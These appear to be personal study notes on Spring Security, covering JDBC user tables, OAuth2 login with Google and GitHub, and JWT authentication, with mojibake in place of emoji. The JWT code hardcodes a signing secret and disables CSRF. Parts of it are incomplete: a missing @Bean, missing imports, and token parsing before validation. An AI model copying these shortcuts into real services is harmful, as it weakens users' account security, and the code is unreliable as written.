â¤ Spring Security queries the DB using SQL queries or default table structures.

1ï¸âƒ£ Database Setup
Spring Security expects a user table and an authority/role table. Default schema:
ğŸ‘‰ users table
| Column   | Type    | Description      |
| -------- | ------- | ---------------- |
| username | VARCHAR | User login       |
| password | VARCHAR | Encoded password |
| enabled  | BOOLEAN | Is user active?  |

ğŸ‘‰ authorities table
| Column   | Type    | Description      |
| -------- | ------- | ---------------- |
| username | VARCHAR | User login       |
| authority| VARCHAR | User authority   |

âœ… Example SQL for H2/SQL:
CREATE TABLE users (
    username VARCHAR(50) PRIMARY KEY,
    password VARCHAR(100) NOT NULL,
    enabled BOOLEAN NOT NULL
);

CREATE TABLE authorities (
    username VARCHAR(50) NOT NULL,
    authority VARCHAR(50) NOT NULL,
    FOREIGN KEY (username) REFERENCES users(username)
);

INSERT INTO users VALUES ('ankur', '$2a$10$AqHq0Yc0p8Uov7E1dQJ6Bu4rF2EvzpYH7QvZ.3pFZ9/V36q3Yd4xi', true);
-- password=1234 (BCrypt)

INSERT INTO authorities VALUES ('ankur', 'ROLE_USER');
âš¡ Note: Passwords must be encoded (BCrypt, for example).


2ï¸âƒ£ Spring Security Configuration for JDBC Authentication
@Configuration
@EnableWebSecurity
public class SecurityConfig {

    @Autowired
    private DataSource dataSource;

    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http
            .csrf(csrf -> csrf.disable())
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/public/").permitAll()
                .requestMatchers("/user/").hasRole("USER")
                .requestMatchers("/admin/").hasRole("ADMIN")
                .anyRequest().authenticated()
            )
            .formLogin(Customizer.withDefaults())
            .httpBasic(Customizer.withDefaults());
        return http.build();
    }

    @Bean
    public UserDetailsService users() {
        JdbcUserDetailsManager manager = new JdbcUserDetailsManager(dataSource);
        return manager;
    }

    @Bean
    public PasswordEncoder passwordEncoder() {
        return new BCryptPasswordEncoder();
    }
}
â¤ DataSource â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¶ Spring Boot automatically configures this if you set database properties in application.properties.

ğŸ”— application.properties:
spring.datasource.url=jdbc:mysql://localhost:3306/springsecurity
spring.datasource.username=root
spring.datasource.password=yourpassword
spring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver
spring.jpa.hibernate.ddl-auto=none

â¤ JdbcUserDetailsManager â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¶ Loads user credentials and roles from the DB.
    âœ”ï¸ Uses default queries:
        ğŸ”— SELECT username, password, enabled FROM users WHERE username = ?
        ğŸ”— SELECT username, authority FROM authorities WHERE username = ?

    âœ”ï¸ Can be customized using:
        ğŸ”— manager.setUsersByUsernameQuery("custom query");
        ğŸ”— manager.setAuthoritiesByUsernameQuery("custom query");

â¤ PasswordEncoder â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¶ Passwords in the DB must be encoded (BCrypt recommended).
â¤ Roles â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¶ Must start with ROLE_ if using hasRole() in SecurityFilterChain.


3ï¸âƒ£ How It Works at Runtime
â¤ User hits /login endpoint.
â¤ Spring Security uses JdbcUserDetailsManager to:
    âœ”ï¸ Query user credentials
    âœ”ï¸ Load roles/authorities
â¤ Checks password using PasswordEncoder.
â¤ If successful, user is authenticated and roles are applied for authorization.





===========
ğŸ”· OAuth2
===========
â¤ OAuth2 (Open Authorization 2.0) is a framework for authorization â€” not authentication.
â¤ It allows an app (Client) to securely access resources (like user data) from another service (Resource Server) without sharing credentials (like passwords).

âœ… Example
â¤ You click â€œLogin with Googleâ€ on Spotify:
â¤ Google authenticates you (proves your identity)
â¤ Spotify receives limited access (like your email)
â¤ You never give Spotify your Google password.
â¤ Thatâ€™s OAuth2 in action.

ğŸ”„ Key Roles in OAuth2
| Role                 | Description                               | Example               |
| ---------------------| ----------------------------------------- | --------------------- |
| Resource Owner       | The user who owns the data                | You                   |
| Client               | The app that wants access                 | Spotify               |
| Authorization Server | Issues access tokens after verifying user | Google                |
| Resource Server      | Hosts protected APIs or data              | Googleâ€™s userinfo API |


ğŸ”„ OAuth2 Grant Types (Flows)
Each â€œflowâ€ defines how tokens are issued. Spring Security supports all major ones.

| Grant Type           | Use Case                                     | Who Uses It        |
| ---------------------| -------------------------------------------- | ------------------ |
| Authorization Code   | Server-side web apps (secure, uses redirect) | Login with Google  |
| Implicit             | Deprecated (for SPAs, not secure)            | Old JS apps        |
| Password Credentials | User directly gives username/password        | Internal apps only |
| Client Credentials   | Service-to-service (no user involved)        | Microservices      |
| Refresh Token        | Used to renew access tokens                  | All apps           |

ğŸ”„ Tokens in OAuth2
| Token Type                | Purpose                           | Example                   |
| --------------------------| --------------------------------- | ------------------------- |
| Access Token              | Grants access to resource         | `ya29.a0AfH6S...`         |
| Refresh Token             | Used to get a new access token    | `1//0gLqF7L5...`          |
| ID Token (OpenID Connect) | Contains user identity info (JWT) | `eyJhbGciOiJIUzI1NiIs...` |
ğŸ‘‰ ID Token = only when OAuth2 + OpenID Connect (OIDC) used â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¶ gives authentication info.


ğŸ”„ OAuth2 Flow in Steps (Authorization Code Grant)
1ï¸âƒ£ User clicks â€œLogin with Googleâ€

ğŸ‘‰ Spring redirects to:
https://accounts.google.com/o/oauth2/auth?
 client_id=xyz
 &redirect_uri=http://localhost:8080/login/oauth2/code/google
 &scope=email profile
 &response_type=code


2ï¸âƒ£ Google shows consent screen
ğŸ‘‰ User grants access.


3ï¸âƒ£ Google redirects back with code
http://localhost:8080/login/oauth2/code/google?code=abc123


4ï¸âƒ£ Spring exchanges code for tokens
ğŸ‘‰ Spring Security automatically calls Google token endpoint to get:
{
 "access_token": "ya29.a0AfH6S...",
 "id_token": "eyJhbGciOiJIUzI1NiIs..."
}

Step 5ï¸âƒ£ Spring fetches user info from Google
ğŸ‘‰ User info API: https://www.googleapis.com/oauth2/v3/userinfo


6ï¸âƒ£ User authenticated
Spring Security creates a OAuth2AuthenticationToken and logs the user in.


7ï¸âƒ£ Basic Configuration in Spring Boot
Dependencies (pom.xml):

<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-oauth2-client</artifactId>
</dependency>
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-security</artifactId>
</dependency>


ğŸ”— application.yml
spring:
  security:
    oauth2:
      client:
        registration:
          google:
            client-id: YOUR_GOOGLE_CLIENT_ID
            client-secret: YOUR_GOOGLE_CLIENT_SECRET
            scope:
              - email
              - profile
âœ”ï¸ Spring Security auto-configures /oauth2/authorization/google and /login/oauth2/code/google.


ğŸ”„ Security Configuration
@Configuration
@EnableWebSecurity
public class SecurityConfig {

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/", "/home").permitAll()
                .anyRequest().authenticated()
            )
            .oauth2Login(Customizer.withDefaults())  // enable login with Google
            .logout(logout -> logout
                .logoutSuccessUrl("/").permitAll()
            );
        return http.build();
    }
}
âœ”ï¸ Spring handles all redirections, token exchanges, and user info retrieval automatically.


8ï¸âƒ£ How Spring Security Manages OAuth2
When user logs in:
â¤ Spring fetches the tokens and stores them in a SecurityContext.
â¤ It creates:
    âœ”ï¸ OAuth2User â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¶ contains user info (email, name, picture)
    âœ”ï¸ OAuth2AuthenticationToken â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¶ represents logged-in session

â¤ You can access them in controller:
@GetMapping("/user")
public Map<String, Object> user(@AuthenticationPrincipal OAuth2User principal) {
    return principal.getAttributes();
}


9ï¸âƒ£ Role of OAuth2 in Microservices
In microservices, OAuth2 is often used for:
âœ… Single Sign-On (SSO) â€” one login for multiple apps.
âœ… Service-to-Service authentication (client credentials flow).
âœ… API Gateway security â€” verifying access tokens at gateway.
âœ”ï¸ Usually implemented with Keycloak, Auth0, or Spring Authorization Server.


ğŸ”„Spring Authorization Server
â¤ If you want your own Google-like login system, use:
<dependency>
    <groupId>org.springframework.security</groupId>
    <artifactId>spring-authorization-server</artifactId>
</dependency>
ğŸ‘‰ It lets you:
    âœ”ï¸ Issue JWTs
    âœ”ï¸ Manage client apps
    âœ”ï¸ Implement all OAuth2 flows
ğŸ‘‰ Used in microservices as a central auth service.


4ï¸âƒ£ OAuth2 in Microservices Architecture
Typical layout:
[Auth Server] â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¶ issues JWT access tokens
   â†“
[API Gateway] â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¶ validates JWT before forwarding
   â†“
[Microservices] â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¶ act as Resource Servers
ğŸ‘‰ Each microservice:
    âœ”ï¸ doesnâ€™t handle login directly
    âœ”ï¸ just validates the JWT â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¶ ensures scalability and central security.


ğŸ”· If want to configure OAuth with Github.com
1ï¸âƒ£ You can use the following dependency:
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-oauth2-client</artifactId>
</dependency>


2ï¸âƒ£ Register Your App on GitHub
â¤ Go to https://github.com/settings/developers
â¤ Click â€œNew OAuth Appâ€
â¤ Fill out the form:
    âœ”ï¸ Application name: SpringBoot GitHub OAuth
    âœ”ï¸ Homepage URL: http://localhost:8080
    âœ”ï¸ Authorization callback URL: http://localhost:8080/login/oauth2/code/github
        This callback URL must exactly match your Spring Boot redirect URI.
â¤ Once created, youâ€™ll get:
    âœ”ï¸ Client ID
    âœ”ï¸ Client Secret
ğŸ‘‰ Keep these safe â€” youâ€™ll use them in your application.yml.


3ï¸âƒ£ Configure application.yml
ğŸ‘‰ Create src/main/resources/application.yml and add:
spring:
  security:
    oauth2:
      client:
        registration:
          github:
            client-id: your_client_id_here
            client-secret: your_client_secret_here
            scope: user:email
            redirect-uri: "{baseUrl}/login/oauth2/code/{registrationId}"
            client-name: GitHub
            client-authentication-method: client_secret_basic
            authorization-grant-type: authorization_code
        provider:
          github:
            authorization-uri: https://github.com/login/oauth/authorize
            token-uri: https://github.com/login/oauth/access_token
            user-info-uri: https://api.github.com/user
            user-name-attribute: login
server:
  port: 8080

ğŸ‘‰ Explanation:
â¤ registration.github â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¶ defines the OAuth app registration (client details).
â¤ provider.github â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¶ defines GitHub-specific OAuth endpoints.
â¤ redirect-uri â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¶ must match what you registered in GitHub Developer settings.


4ï¸âƒ£ Create Security Configuration
ğŸ‘‰ Spring Boot can automatically configure OAuth2 login, but for more control, define a SecurityConfig:

package com.example.security;

import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.web.SecurityFilterChain;

@Configuration
public class SecurityConfig {

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/", "/login").permitAll()
                .anyRequest().authenticated()
            )
            .oauth2Login(oauth -> oauth
                .loginPage("/login")
            )
            .logout(logout -> logout
                .logoutSuccessUrl("/")
                .permitAll()
            );

        return http.build();
    }
}
ğŸ‘‰ Explanation:
âœ”ï¸ /login â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¶ public route for manual login.
âœ”ï¸ All other routes require authentication.
âœ”ï¸ .oauth2Login() automatically configures the OAuth2 flow.

5ï¸âƒ£ Create a Controller
package com.example.controller;

import org.springframework.security.core.annotation.AuthenticationPrincipal;
import org.springframework.security.oauth2.core.user.OAuth2User;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.GetMapping;

@Controller
public class HomeController {

    @GetMapping("/")
    public String home() {
        return "index";
    }

    @GetMapping("/user")
    public String user(@AuthenticationPrincipal OAuth2User user, Model model) {
        model.addAttribute("name", user.getAttribute("name"));
        model.addAttribute("login", user.getAttribute("login"));
        model.addAttribute("avatar", user.getAttribute("avatar_url"));
        return "user";
    }
}


=====================
ğŸ”· JWT + SpringBoot
=====================
JWT (JSON Web Token) is a compact, URL-safe way to represent claims (user data or permissions) between two parties â€” typically client and server â€” in a secure and stateless way.

â¤ JWT is a string-based token.
â¤ Itâ€™s digitally signed using HMAC (symmetric) or RSA (asymmetric) algorithms.
â¤ It helps the server authenticate and authorize users without maintaining sessions.


2ï¸âƒ£ Structure of a JWT
A JWT has 3 parts, separated by dots (.):
ğŸ”— xxxxx.yyyyy.zzzzz

â¤ Header â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¶ metadata
â¤ Payload â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¶ actual user data
â¤ Signature â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¶ to verify integrity

âœ… Example:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.      â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¶ Header (Base64)
eyJzdWIiOiJhbmF1ciIsImlhdCI6MTY3NDAxMzM1NSwiZXhwIjoxNjc0MDEzNjU1fQ.  â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¶ Payload (Base64)
OHkHac4ZsnbnT7dbDLyJo4sP0wvZ6Oey_cwe5UB0kX8  â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¶ Signature

3ï¸âƒ£ Whatâ€™s Inside?
â¤ Header (JSON)
{
  "alg": "HS256",
  "typ": "JWT"
}

â¤ Payload (JSON)
{
  "sub": "ankur",
  "role": "ADMIN",
  "iat": 1731018800,
  "exp": 1731022400
}
| Field  | Meaning                   |
| ------ | ------------------------- |
| `sub`  | Subject (user identifier) |
| `role` | Userâ€™s role               |
| `iat`  | Issued at (timestamp)     |
| `exp`  | Expiration time           |

â¤ Signature
ğŸ‘‰ Created by signing the header + payload using a secret key:
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret
)


4ï¸âƒ£ Why Use JWT?
| Feature          | Explanation                                           |
| ---------------  | ----------------------------------------------------- |
| âœ… Stateless     | Server doesnâ€™t store sessions; token carries all info |
| âœ… Scalable      | Ideal for microservices and distributed systems       |
| âœ… Secure        | Signed (and optionally encrypted)                     |
| âœ… Interoperable | JSON-based, used across languages                     |

ğŸ”„ JWT Flow in Spring Boo
Hereâ€™s how JWT authentication works inside SpringBoot:

     +------------+         +-----------------+
     |   Client   |  --->   |  /login (Auth)  |
     +------------+         +-----------------+
             |                      |
             |   POST credentials   |
             |--------------------->|
             |                      |
             |   JWT issued         |
             |<---------------------|
             |                      |
             |   Send JWT in Header |
             |--------------------->|
             |   Access /api/...    |
             |                      |
ğŸ‘‰ Steps:
â¤ User sends username/password to /authenticate endpoint.
â¤ Server validates credentials.
â¤ Server creates a JWT token signed with a secret key.
â¤ Token is sent back to client.
â¤ For every next request â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¶ client includes JWT in the Authorization header:
    ğŸ”— Authorization: Bearer <token>
â¤ Server verifies signature â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¶ grants access.


6ï¸âƒ£ Implementation in Spring Boot
1ï¸âƒ£ Add Dependencies
ğŸ‘‰ Add to pom.xml:

<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-security</artifactId>
</dependency>

<dependency>
    <groupId>io.jsonwebtoken</groupId>
    <artifactId>jjwt-api</artifactId>
    <version>0.11.5</version>
</dependency>

<dependency>
    <groupId>io.jsonwebtoken</groupId>
    <artifactId>jjwt-impl</artifactId>
    <version>0.11.5</version>
    <scope>runtime</scope>
</dependency>

<dependency>
    <groupId>io.jsonwebtoken</groupId>
    <artifactId>jjwt-jackson</artifactId>
    <version>0.11.5</version>
    <scope>runtime</scope>
</dependency>


2ï¸âƒ£ JWT Utility Class
import io.jsonwebtoken.*;
import io.jsonwebtoken.security.Keys;
import java.util.*;
import java.security.Key;
import org.springframework.stereotype.Component;

@Component
public class JwtUtil {
    private static final String SECRET_KEY = "mysecretkey1234567890mysecretkey";

    private Key getSigningKey() {
        return Keys.hmacShaKeyFor(SECRET_KEY.getBytes());
    }

    public String generateToken(String username) {
        return Jwts.builder()
                .setSubject(username)
                .setIssuedAt(new Date())
                .setExpiration(new Date(System.currentTimeMillis() + 1000 * 60 * 60)) // 1 hour
                .signWith(getSigningKey(), SignatureAlgorithm.HS256)
                .compact();
    }

    public boolean validateToken(String token) {
        try {
            Jwts.parserBuilder().setSigningKey(getSigningKey()).build().parseClaimsJws(token);
            return true;
        } catch (JwtException ex) {
            return false;
        }
    }

    public String extractUsername(String token) {
        return Jwts.parserBuilder()
                .setSigningKey(getSigningKey())
                .build()
                .parseClaimsJws(token)
                .getBody()
                .getSubject();
    }
}

3ï¸âƒ£ Authentication Filter
import jakarta.servlet.*;
import jakarta.servlet.http.*;
import org.springframework.security.core.userdetails.UserDetailsService;
import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;
import org.springframework.security.core.context.SecurityContextHolder;
import org.springframework.security.web.authentication.WebAuthenticationDetailsSource;
import org.springframework.stereotype.Component;
import java.io.IOException;
import lombok.RequiredArgsConstructor;

@Component
@RequiredArgsConstructor
public class JwtAuthFilter extends OncePerRequestFilter {

    private final JwtUtil jwtUtil;
    private final UserDetailsService userDetailsService;

    @Override
    protected void doFilterInternal(HttpServletRequest request, HttpServletResponse response, FilterChain filterChain)
            throws ServletException, IOException {
        final String authHeader = request.getHeader("Authorization");
        String username = null;
        String token = null;

        if (authHeader != null && authHeader.startsWith("Bearer ")) {
            token = authHeader.substring(7);
            username = jwtUtil.extractUsername(token);
        }

        if (username != null && SecurityContextHolder.getContext().getAuthentication() == null) {
            var userDetails = userDetailsService.loadUserByUsername(username);
            if (jwtUtil.validateToken(token)) {
                var authToken = new UsernamePasswordAuthenticationToken(userDetails, null, userDetails.getAuthorities());
                authToken.setDetails(new WebAuthenticationDetailsSource().buildDetails(request));
                SecurityContextHolder.getContext().setAuthentication(authToken);
            }
        }

        filterChain.doFilter(request, response);
    }
}

4ï¸âƒ£ Security Configuration
import org.springframework.context.annotation.*;
import org.springframework.security.authentication.*;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;
import org.springframework.security.web.SecurityFilterChain;
import org.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter;
import lombok.RequiredArgsConstructor;

@Configuration
@EnableWebSecurity
@RequiredArgsConstructor
public class SecurityConfig {

    private final JwtAuthFilter jwtAuthFilter;

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http.csrf(csrf -> csrf.disable())
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/authenticate").permitAll()
                .anyRequest().authenticated()
            )
            .addFilterBefore(jwtAuthFilter, UsernamePasswordAuthenticationFilter.class);
        return http.build();
    }

    public PasswordEncoder passwordEncoder() {
        return new BCryptPasswordEncoder();
    }
}

5ï¸âƒ£ Authentication Controller
import org.springframework.web.bind.annotation.*;
import org.springframework.security.authentication.*;
import org.springframework.security.core.userdetails.UserDetailsService;
import lombok.RequiredArgsConstructor;

@RestController
@RequiredArgsConstructor
public class AuthController {

    private final AuthenticationManager authManager;
    private final JwtUtil jwtUtil;


    @PostMapping("/authenticate")
    public String authenticate(@RequestParam String username, @RequestParam String password) {
        authManager.authenticate(new UsernamePasswordAuthenticationToken(username, password));
        return jwtUtil.generateToken(username);
    }
}

